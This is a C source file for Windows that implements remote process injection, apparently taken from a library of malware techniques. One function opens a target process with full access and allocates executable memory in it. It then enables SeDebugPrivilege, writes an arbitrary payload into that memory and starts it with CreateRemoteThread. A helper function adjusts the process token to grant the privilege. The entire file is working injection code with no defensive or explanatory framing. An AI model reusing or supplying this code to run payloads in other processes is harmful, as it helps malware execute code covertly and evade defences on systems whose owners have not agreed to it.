BOOL EnablePrivilege(LPCWSTR Privilege, BOOL bEnablePrivilege);

BOOL MpfPiWriteProcessMemoryCreateRemoteThread(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes, _In_ DWORD TargetProcessId)
{
    HANDLE hHandle = NULL, hThread = NULL;
    LPVOID BaseAddress = NULL;
    BOOL bFlag = FALSE;

    hHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, TargetProcessId);
    if (hHandle == NULL)
        goto EXIT_ROUTINE;

    BaseAddress = VirtualAllocEx(hHandle, NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (BaseAddress == NULL)
        goto EXIT_ROUTINE;

    // Increase the permissions of the current process
    if (!EnablePrivilege(L"SeDebugPrivilege", TRUE))
        goto EXIT_ROUTINE;

    if (!WriteProcessMemory(hHandle, BaseAddress, Payload, PayloadSizeInBytes, NULL))
        goto EXIT_ROUTINE;

    hThread = CreateRemoteThread(hHandle, NULL, 0, (LPTHREAD_START_ROUTINE)BaseAddress, NULL, 0, NULL);
    if (hThread == NULL)
        goto EXIT_ROUTINE;

    WaitForSingleObject(hThread, INFINITE);

    bFlag = TRUE;

EXIT_ROUTINE:

    if (hThread)
        CloseHandle(hThread);

    if (hHandle)
        CloseHandle(hHandle);

    return bFlag;
}

BOOL EnablePrivilege(LPCWSTR Privilege, BOOL bEnablePrivilege)
{
    HANDLE hToken;
    LUID luid;
    BOOL bResult;

    // Open process token
    bResult = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
    if (!bResult) 
        return FALSE;

    // Lookup privilege value
    bResult = LookupPrivilegeValue(NULL, Privilege, &luid);
    if (!bResult) 
    {
        CloseHandle(hToken);
        return FALSE;
    }

    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    // Enable or disable privilege
    bResult = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL);
    if (!bResult) 
    {
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    return TRUE;
}
